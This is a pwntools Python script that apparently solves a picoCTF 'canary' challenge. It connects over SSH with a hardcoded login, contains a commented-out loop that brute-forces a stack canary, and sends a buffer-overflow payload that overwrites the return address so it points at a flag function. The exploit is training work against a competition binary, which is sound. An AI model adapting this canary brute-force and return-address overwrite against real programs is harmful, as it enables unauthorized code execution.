from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

addressOfFlagFxn = b'\xed\x07\x00\x00'
addr = '\xed\x07\x00\x00'

canary = 'LjgH'
# for length in range(33, 37):
#     for i in range(0, 256):
#         program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
#         program.recvline()
#         program.recv()
#         program.sendline(str(length))
#         program.recv()
#         program.sendline('a' * 32 + canary + chr(i))
#         output = program.recvline()
#         if b'Canary' not in output:
#             print(output)
#             canary += chr(i)
#             break

random_str = cyclic(200)
setStr = random_str.decode("utf-8")
payload = 'a' * 32 + canary + 'a' * 16 + addr
check = str(len(payload))
print(check)

program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
# print(program.recvline())
# print(program.recv())
# program.sendline(str(len(payload)))
# print(program.recv())
# program.sendline(payload)
# print(program.recvall(timeout=5.5))

key = unhex('4c6a6748')
program.sendlineafter('> ', str(32+4+12+6))
program.sendlineafter('> ', 'a'*32+key+'a'*(4+12)+'\xed\x07')
# sh.interactive()
data = program.recvall(timeout=0.5)
print(data)
